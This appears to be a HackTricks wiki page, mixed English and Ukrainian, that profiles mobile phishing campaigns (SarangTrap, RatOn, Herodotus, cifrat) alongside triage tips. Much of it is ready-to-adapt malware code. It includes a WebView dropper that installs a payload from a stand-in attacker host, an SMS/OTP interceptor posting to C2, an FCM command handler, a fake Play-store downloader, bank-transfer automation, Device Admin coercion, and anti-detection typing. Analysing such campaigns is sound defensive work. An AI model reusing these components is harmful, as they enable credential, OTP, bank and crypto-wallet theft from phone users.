# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> This page covers techniques used by threat actors to distribute **malicious Android APKs** and **iOS mobile-configuration profiles** through phishing (SEO, social engineering, fake stores, dating apps, etc.).
> Матеріал адаптовано з кампанії SarangTrap, розкритої Zimperium zLabs (2025), та інших публічних досліджень.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Register dozens of look-alike domains (dating, cloud share, car service…).
– Use local language keywords and emojis in the `<title>` element to rank in Google.
– Host *both* Android (`.apk`) and iOS install instructions on the same landing page.
2. **First Stage Download**
* Android: direct link to an *unsigned* or “third-party store” APK.
* iOS: `itms-services://` or plain HTTPS link to a malicious **mobileconfig** profile (see below).
3. **Post-install Social Engineering**
* On first run the app asks for an **invitation / verification code** (exclusive access illusion).
* The code is **POSTed over HTTP** to the Command-and-Control (C2).
* C2 replies `{"success":true}` ➜ malware continues.
* Sandbox / AV dynamic analysis that never submits a valid code sees **no malicious behaviour** (evasion).
4. **Runtime Permission Abuse** (Android)
* Dangerous permissions are only requested **after positive C2 response**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Recent variants **remove `<uses-permission>` for SMS from `AndroidManifest.xml`** but leave the Java/Kotlin code path that reads SMS through reflection ⇒ lowers static score while still functional on devices that grant the permission via `AppOps` abuse or old targets.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 introduced **Restricted settings** for sideloaded apps: Accessibility and Notification Listener toggles are greyed out until the user explicitly allows restricted settings in **App info**.
* Phishing pages and droppers now ship step-by-step UI instructions to **allow restricted settings** for the sideloaded app and then enable Accessibility/Notification access.
* A newer bypass is to install the payload via a **session-based PackageInstaller flow** (the same method app stores use). Android treats the app as store-installed, so Restricted settings no longer blocks Accessibility.
* Triage hint: in a dropper, grep for `PackageInstaller.createSession/openSession` plus code that immediately navigates the victim to `ACTION_ACCESSIBILITY_SETTINGS` or `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* App shows harmless views (SMS viewer, gallery picker) implemented locally.
* Meanwhile it exfiltrates:
- IMEI / IMSI, phone number
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG from `/sdcard/DCIM` compressed with [Luban](https://github.com/Curzibn/Luban) to reduce size
- Optional SMS content (`content://sms`)
Payloads are **batch-zipped** and sent via `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* A single **mobile-configuration profile** can request `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. to enroll the device in “MDM”-like supervision.
* Social-engineering instructions:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (screenshots on the phishing page).
3. Trust the unsigned profile ➜ attacker gains *Contacts* & *Photo* entitlement without App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads can **pin a phishing URL to the Home Screen** with a branded icon/label.
* Web Clips can run **full-screen** (hides the browser UI) and be marked **non-removable**, forcing the victim to delete the profile to remove the icon.
9. **Network Layer**
* Plain HTTP, often on port 80 with HOST header like `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → easy to spot).

## Red-Team Tips

* **Dynamic Analysis Bypass** – During malware assessment, automate the invitation code phase with Frida/Objection to reach the malicious branch.
* **Manifest vs. Runtime Diff** – Compare `aapt dump permissions` with runtime `PackageManager#getRequestedPermissions()`; missing dangerous perms is a red flag.
* **Network Canary** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` to detect unsolid POST bursts after code entry.
* **mobileconfig Inspection** – Use `security cms -D -i profile.mobileconfig` on macOS to list `PayloadContent` and spot excessive entitlements.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Індикатори (Generic)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Цей pattern було помічено в campaigns, що зловживають темою government-benefit, щоб викрадати Indian UPI credentials і OTPs. Operators chain reputable platforms для delivery і resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description містить short link
- Shortlink → GitHub Pages phishing site, що імітує legit portal
- Same GitHub repo hosts APK з фейковим “Google Play” badge, який лінкує directly to the file
- Dynamic phishing pages живуть на Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper), який ships the real malware at `assets/app.apk` і prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Динамічне виявлення endpoint через shortlink
- Malware отримує plain-text, comma-separated список active endpoint'ів із shortlink; прості string transforms формують фінальний шлях phishing page.

Example (sanitised):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Псевдокод:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### Збір UPI-облікових даних через WebView
- Крок “Make payment of ₹1 / UPI‑Lite” завантажує HTML-форму зловмисника з динамічного endpoint всередині WebView і перехоплює чутливі поля (phone, bank, UPI PIN), які `POST`яться до `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Самопоширення та перехоплення SMS/OTP
- Під час першого запуску запитуються агресивні дозволи:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Контакти використовуються для mass-send smishing SMS із пристрою жертви.
- Вхідні SMS перехоплюються broadcast receiver і завантажуються разом із метаданими (sender, body, SIM slot, per-device random ID) до `/addsm.php`.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) як стійкий C2
- Payload реєструється в FCM; push messages містять поле `_type`, яке використовується як switch для запуску дій (наприклад, оновлення phishing text templates, перемикання behaviours).

Приклад FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler sketch:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK містить secondary payload у `assets/app.apk`
- WebView завантажує payment з `gate.htm` і exfiltrates до `/addup.php`
- SMS exfiltration до `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`), що повертає CSV endpoints
- Apps, позначені як generic “Update/Secure Update”
- FCM `data` messages з `_type` discriminator у untrusted apps

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers дедалі частіше замінюють static APK links на Socket.IO/WebSocket channel, вбудований у lure, що виглядає як Google Play. Це приховує payload URL, обходить URL/extension filters і зберігає реалістичний install UX.

Typical client flow observed in the wild:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Чому це обходить прості controls:
- Жоден статичний APK URL не експонується; payload відтворюється в пам’яті з WebSocket frames.
- URL/MIME/extension filters, які блокують direct .apk responses, можуть пропустити binary data, tunneled via WebSockets/Socket.IO.
- Crawlers і URL sandboxes, які не execute WebSockets, не зможуть отримати payload.

Див. також WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

Кампанія RatOn banker/RAT (ThreatFabric) є конкретним прикладом того, як сучасні mobile phishing operations поєднують WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover і навіть NFC-relay orchestration. Цей розділ абстрагує повторно використовувані techniques.

### Stage-1: WebView → native install bridge (dropper)
Attackers показують WebView, що вказує на attacker page, і inject JavaScript interface, яка exposes native installer. Tap по HTML button викликає native code, що installs second-stage APK bundled в assets dropper’а, а потім launches його directly.

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML на сторінці:
```html
<button onclick="bridge.installApk()">Install</button>
```
Після встановлення, dropper запускає payload через explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ідея полювання: untrusted apps, що викликають `addJavascriptInterface()` і відкривають у WebView методи, схожі на installer; APK, що постачається з вбудованим secondary payload у `assets/` і викликає Package Installer Session API.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 відкриває WebView, який хостить сторінку “Access”. Її button викликає exported method, що переводить жертву до налаштувань Accessibility і запитує увімкнення rogue service. Після надання дозволу malware використовує Accessibility, щоб auto-click проходити через наступні runtime permission dialogs (contacts, overlay, manage system settings, etc.) і запитує Device Admin.

- Accessibility programmatically допомагає приймати подальші prompts, знаходячи buttons like “Allow”/“OK” у node-tree та надсилаючи clicks.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Див. також:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operators can issue commands to:
- render a full-screen overlay from a URL, or
- pass inline HTML that is loaded into a WebView overlay.

Likely uses: coercion (PIN entry), wallet opening to capture PINs, ransom messaging. Keep a command to ensure overlay permission is granted if missing.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: periodically dump the Accessibility node tree, serialize visible texts/roles/bounds and send to C2 as a pseudo-screen (commands like `txt_screen` once and `screen_live` continuous).
- High-fidelity: request MediaProjection and start screen-casting/recording on demand (commands like `display` / `record`).

### ATS playbook (bank app automation)
Given a JSON task, open the bank app, drive the UI via Accessibility with a mix of text queries and coordinate taps, and enter the victim’s payment PIN when prompted.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Приклади текстів, що бачили в одному цільовому потоці (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Оператори також можуть перевіряти/збільшувати ліміти переказів через команди на кшталт `check_limit` і `limit`, які так само переходять через UI лімітів.

### Crypto wallet seed extraction
Цілі на кшталт MetaMask, Trust Wallet, Blockchain.com, Phantom. Потік: розблокувати (викрадений PIN або наданий пароль), перейти в Security/Recovery, відкрити/reveal seed phrase, записати її через keylog/exfiltrate. Реалізуйте locale-aware селектори (EN/RU/CZ/SK), щоб стабілізувати навігацію між мовами.

### Device Admin coercion
Device Admin APIs використовуються, щоб збільшити можливості для захоплення PIN і ускладнити життя жертві:

- Immediate lock:
```java
dpm.lockNow();
```
- Завершити поточні облікові дані, щоб примусити зміну (Accessibility захоплює новий PIN/password):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Примусове розблокування без біометрії шляхом вимкнення biometric features keyguard:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Примітка: Many DevicePolicyManager controls require Device Owner/Profile Owner on recent Android; some OEM builds may be lax. Завжди перевіряйте на цільовій ОС/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 can install and launch an external NFC-relay module (e.g., NFSkate) and even hand it an HTML template to guide the victim during the relay. Це дає змогу contactless card-present cash-out разом із online ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Threat actors increasingly blend Accessibility-driven automation with anti-detection tuned against basic behaviour biometrics. Нещодавній banker/RAT показує два взаємодоповнювальні режими доставки тексту та перемикач оператора для імітації людського набору з випадковою cadence.

- Discovery mode: enumerate visible nodes with selectors and bounds to precisely target inputs (ID, text, contentDescription, hint, bounds) before acting.
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` directly on the target node (stable, no keyboard);
- Mode 2 – clipboard set + `ACTION_PASTE` into the focused node (works when direct setText is blocked).
- Human-like cadence: split the operator-provided string and deliver it character-by-character with randomized 300–3000 ms delays between events to evade “machine-speed typing” heuristics. Implemented either by progressively growing the value via `ACTION_SET_TEXT`, or by pasting one char at a time.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Блокувальні overlay для fraud охоплюють:
- Відображення повноекранного `TYPE_ACCESSIBILITY_OVERLAY` з керованою оператором непрозорістю; залишайте його непрозорим для жертви, поки віддалена automation виконується під ним.
- Зазвичай доступні команди: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Мінімальний overlay з регульованою alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Багатоступеневий Android dropper з WebView bridge, JNI декодером рядків і staged DEX loading

Аналіз CERT Polska від 03 April 2026 **cifrat** — це хороший орієнтир для сучасного Android loader, доставленого через phishing, де видимий APK є лише installer shell. Повторно використовувана тактика тут не у назві сімейства, а в тому, як зв’язані стадії:

1. Phishing page доставляє lure APK.
2. Stage 0 запитує `REQUEST_INSTALL_PACKAGES`, завантажує native `.so`, розшифровує вбудований blob і встановлює stage 2 за допомогою **PackageInstaller sessions**.
3. Stage 2 розшифровує ще один прихований asset, трактує його як ZIP і **динамічно завантажує DEX** для фінального RAT.
4. Final stage зловживає Accessibility/MediaProjection і використовує WebSockets для control/data.

### WebView JavaScript bridge як controller інсталятора

Замість того щоб використовувати WebView лише для fake branding, lure може експонувати bridge, який дозволяє local/remote page зняти fingerprint з device і тригерити native install logic:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Ідеї для triage:
- grep для `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` і remote phishing URLs, які використовуються в тому самому activity
- слідкуйте за bridges, що expose installer-like methods (`start`, `install`, `openAccessibility`, `requestOverlay`)
- якщо bridge підтримується phishing page, розглядайте його як operator/controller surface, а не просто UI

### Native string decoding registered in `JNI_OnLoad`

Один корисний pattern — це Java method, яка виглядає harmless, але насправді підтримується `RegisterNatives` під час `JNI_OnLoad`. У cifrat decoder ігнорував перший char, використовував другий як 1-byte XOR key, hex-decoded решту і трансформував кожен byte як `((b - i) & 0xff) ^ key`.

Minimal offline reproduction:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Використовуйте це, коли бачите:
- повторні виклики одного native-backed Java method для URLs, package names або keys
- `JNI_OnLoad` розв’язує classes і викликає `RegisterNatives`
- у DEX немає змістовних plaintext strings, але є багато коротких hex-looking constants, переданих в один helper

### Layered payload staging: XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

Це сімейство використовувало два шари unpacking, які варто шукати generically:

- **Stage 0**: decrypt `res/raw/*.bin` за допомогою XOR key, отриманого через native decoder, потім install plaintext APK через `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit`
- **Stage 2**: extract innocuous asset, наприклад `FH.svg`, decrypt його за допомогою RC4-like routine, parse результат як ZIP, потім load hidden DEX files

Це сильний індикатор справжнього dropper/loader pipeline, тому що кожен шар робить наступний stage opaque для базового static scanning.

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES` разом із `PackageInstaller` session calls
- receivers для `PACKAGE_ADDED` / `PACKAGE_REPLACED`, щоб continue the chain після install
- encrypted blobs у `res/raw/` або `assets/` з non-media extensions
- `DexClassLoader` / `InMemoryDexClassLoader` / ZIP handling поруч із custom decryptors

### Native anti-debugging through `/proc/self/maps`

Native bootstrap також сканував `/proc/self/maps` на `libjdwp.so` і abort, якщо він присутній. Це практична early anti-analysis check, тому що debugging на основі JDWP залишає впізнавану mapped library:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Ідеї для пошуку:
- grep native code / decompiler output for `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu`
- якщо Frida hooks приходять занадто пізно, спочатку перевір `.init_array` і `JNI_OnLoad`
- розглядай anti-debug + string decoder + staged install як один кластер, а не незалежні findings

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
